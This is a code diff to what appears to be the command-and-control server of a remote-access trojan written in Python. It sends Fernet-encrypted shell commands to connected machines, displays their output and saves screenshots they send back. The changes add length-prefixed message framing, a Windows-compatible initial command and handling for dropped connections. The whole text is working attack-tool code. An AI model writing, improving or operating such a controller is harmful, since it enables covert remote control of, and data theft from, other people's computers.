@@ -1,6 +1,7 @@
 import socket
 from cryptography.fernet import Fernet
 import threading
+import struct
 
 # Key management
 KEY_FILE = "secret.key"
@@ -16,39 +17,65 @@ except FileNotFoundError:
 fernet = Fernet(key)
 print(f"AES Key: {key.decode()}")
 
+def send_data(s, fernet, data):
+    try:
+        encrypted_data = fernet.encrypt(data)
+        s.sendall(struct.pack('<I', len(encrypted_data)))
+        s.sendall(encrypted_data)
+    except (socket.error, BrokenPipeError, ConnectionResetError):
+        pass
+
+def recv_data(s, fernet):
+    try:
+        packed_len = s.recv(4)
+        if not packed_len:
+            return None
+        msg_len = struct.unpack('<I', packed_len)[0]
+
+        full_msg = b''
+        while len(full_msg) < msg_len:
+            chunk = s.recv(msg_len - len(full_msg))
+            if not chunk:
+                return None
+            full_msg += chunk
+        
+        return fernet.decrypt(full_msg)
+    except (socket.error, struct.error, BrokenPipeError, ConnectionResetError):
+        return None
+
 def handle_client(client_socket, addr):
     try:
-        # First, send an initial command to kick things off.
-        # The client will execute this and send back the output.
-        # We'll just get the current working directory to start.
-        initial_cmd = "pwd" # or "cd" for Windows
-        client_socket.send(fernet.encrypt(initial_cmd.encode()))
+        # Send a Windows-compatible initial command
+        initial_cmd = "cd"
+        send_data(client_socket, fernet, initial_cmd.encode())
 
         while True:
-            # Receive and decrypt data from the client
-            data = client_socket.recv(4096)
+            # Receive the output from the last command
+            data = recv_data(client_socket, fernet)
             if not data:
+                print(f"Connection closed by {addr}")
                 break
-            
-            decrypted = fernet.decrypt(data)
 
             # Process and display the data
-            if decrypted.startswith(b"iVBORw0KGgo"):  # PNG magic bytes
+            if data.startswith(b"iVBORw0KGgo"):  # PNG magic bytes
                 with open(f"screenshot_{addr[0]}.png", "wb") as f:
-                    f.write(decrypted)
+                    f.write(data)
                 print(f"Screenshot saved as screenshot_{addr[0]}.png")
             else:
-                # Print the output from the last command
-                print(decrypted.decode(), end='')
+                print(data.decode(errors='ignore'), end='')
 
-            # Now, get the next command from the user and send it
+            # Get the next command from the user and send it
             cmd = input(f"Shell [{addr[0]}]> ")
-            if not cmd: # Handle empty input
-                cmd = "echo"
+            if not cmd.strip():
+                # Send a harmless command to keep the prompt moving
+                send_data(client_socket, fernet, b'echo.')
+                continue
             if cmd.lower() == "exit":
-                client_socket.send(fernet.encrypt(b"exit"))
+                send_data(client_socket, fernet, b"exit")
                 break
-            client_socket.send(fernet.encrypt(cmd.encode()))
+            send_data(client_socket, fernet, cmd.encode())
+    except (ConnectionResetError, BrokenPipeError):
+        print(f"Connection to {addr} lost.")
     except Exception as e:
         print(f"Error with {addr}: {e}")
     finally:
